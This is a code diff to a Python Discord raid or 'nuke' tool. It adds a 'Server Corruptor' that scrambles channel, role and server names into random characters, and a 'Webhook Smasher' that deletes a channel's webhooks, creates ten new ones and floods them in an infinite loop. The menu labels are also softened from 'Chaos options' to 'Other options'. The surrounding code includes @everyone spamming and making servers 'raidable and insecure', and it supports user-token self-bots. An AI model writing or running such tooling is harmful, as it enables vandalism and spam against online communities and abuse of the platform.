@@ -283,6 +283,35 @@ def addemoji(server,encoded,name): # This has pretty huge rate limits, be carefu
         time.sleep(1)
         addemoji(server,encoded,name)
 
+def corrupt_channel(channelid,chanlength):
+    if clienttype == 'bot':
+        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
+    else:
+        headers={ 'Authorization': token,'Content-Type': 'application/json'}
+    payload = {'name': asciigen(chanlength)}
+    src = requests.patch('https://discordapp.com/api/v6/channels/{}'.format(channelid), headers=headers,json=payload)
+    if "You are being rate limited." in str(src.content):
+        time.sleep(1)
+        corrupt_channel(channelid,chanlength)
+
+def corrupt_role(serverid,roleid,rolelength):
+    if clienttype == 'bot':
+        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
+    else:
+        headers={ 'Authorization': token,'Content-Type': 'application/json'}
+    payload = {'name': asciigen(rolelength)}
+    src = requests.patch('https://ptb.discordapp.com/api/v6/guilds/{}/roles/{}'.format(serverid,roleid), headers=headers,json=payload)
+    if "You are being rate limited." in str(src.content):
+        time.sleep(1)
+        corrupt_role(serverid,roleid,rolename)
+
+def webhook_spam(webhook,content):
+    if content == 'asc':
+        content = asciigen(1999)
+    payload = {'content': content}
+    while True:
+        requests.post(webhook, json=payload)
+
 clear()
 print ("Starting...")
 
@@ -380,7 +409,7 @@ async def main(SERVER):
     print (colored("{} Text Channels, {} Voice Channels".format(tchancount,vchancount),menucolour))
     print ("----------------------------------------")
     print ("Options:")
-    print (colored(" 1. Configure then destroy. \n 2. Chaos options \n 3. Create Server Invite. \n 4. Change What the bot is playing. \n 5. Leave server. \n 6. Return to Server Select",menucolour))
+    print (colored(" 1. Configure destruction options. \n 2. Other options \n 3. Create Server Invite. \n 4. Change What the bot is playing. \n 5. Leave server. \n 6. Return to Server Select",menucolour))
     opts = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Select the number for your option: ")
     toggleopts = {
         'namechange': namechange,
@@ -795,12 +824,14 @@ async def main(SERVER):
 
         elif int(opts) == 2:
             clear()
-            print(colored("Chaos options",menucolour))
+            print(colored("Other options",menucolour))
             print(colored("0.  Back",menucolour))
             print(colored("1.  Move People in VC",menucolour))
             print(colored("2.  Mass Nickname Change",menucolour))
             print(colored("3.  Make server Raidable and insecure",menucolour))
             print(colored("4.  Check Bot Permissions",menucolour))
+            print(colored("5.  Channel Webhook Smasher",menucolour))
+            print(colored("6.  Server Corruptor (Destructive)",menucolour))
             sel = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Selection: ')
             if int(sel) == 0:
                 await main(SERVER)
@@ -870,6 +901,58 @@ async def main(SERVER):
                     break
                 await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
                 await main(SERVER)
+            elif int(sel) == 5:
+                clear()
+                print("Webhook Smasher")
+                print("Please Enter the text to spam,\n For random ascii type 'asc' or to go back type 'back' or 'b'\nThis will trigger the rate limit for webhooks instantly.")
+                txtspam = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
+                if txtspam.lower() == "back":
+                    await main(SERVER)
+                if txtspam.lower() == "b":
+                    await main(SERVER)
+                channellist = []
+                clear()
+                print("Please Wait...")
+                for channel in server.text_channels:
+                    for webhook in await channel.webhooks():
+                        await webhook.delete()
+                    channellist.append(channel)
+                if sys.platform.startswith('win32'):
+                    if len(channellist) > 40:
+                        screensize = 7
+                        screensize += len(channellist)
+                        os.system('mode con:cols=70 lines={}'.format(str(screensize)))
+                elif sys.platform.startswith('linux'):
+                    if len(channellist) > 40:
+                        screensize = 7
+                        screensize += len(channellist)
+                        os.system("printf '\033[8;{};70t'".format(str(screensize)))
+                chancounter = -1
+                clear()
+                print("Select Channel To spam.")
+                for channel in channellist:
+                    chancounter += 1
+                    print("{}. {}".format(chancounter,channel))
+                channelchoice = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Channel of Choice: ')
+                try:
+                    chan = channellist[int(channelchoice)]
+                except Exception:
+                    await main(SERVER)
+                webhooks = []
+                for x in range(10):
+                    wh = await chan.create_webhook(name=asciigen(random.randint(2,80)))
+                    webhooks.append('https://discordapp.com/api/webhooks/{}/{}'.format(wh.id,wh.token))
+                for webhook in webhooks:
+                    pool.add_task(webhook_spam,webhook,txtspam)
+                await main(SERVER)
+            elif int(sel) == 6:
+                clear()
+                print ("Are you sure you want to corrupt this server?")
+                y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Y/N: ')
+                if y.lower() == 'y':
+                    await corruptor(server)
+                else:
+                    await main(SERVER)
             else:
                 await main(SERVER)
         elif int(opts) == 3:
@@ -965,6 +1048,32 @@ async def everyonespam(SERVER,usetts):
             message = "@everyone"
             print('@everyone Spamming in: '+channel.name)
             pool.add_task(sendspam,str(channel.id),message,usetts)
+
+async def corruptor(server):
+    clear()
+    SERVER = server.id
+    print("Corrupting...")
+    for channel in server.channels:
+        if random.randint(1,2) == 1:
+            pool.add_task(corrupt_channel,channel.id,len(channel.name))
+        else:
+            continue
+    for role in server.roles:
+        if random.randint(1,2) == 1:
+            pool.add_task(corrupt_role,server.id,role.id,len(role.name))
+        else:
+            continue
+    servername = ''
+    for x in server.name:
+        if random.randint(1,2) == 1:
+            servername += asciigen(1)
+        else:
+            servername += x
+    await server.edit(name=servername)
+    pool.wait_completion()
+    print("Corrupted the server.")
+    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press enter to return to menu.')
+    await main(SERVER)
 
 if clienttype.lower() == "user":
     try:
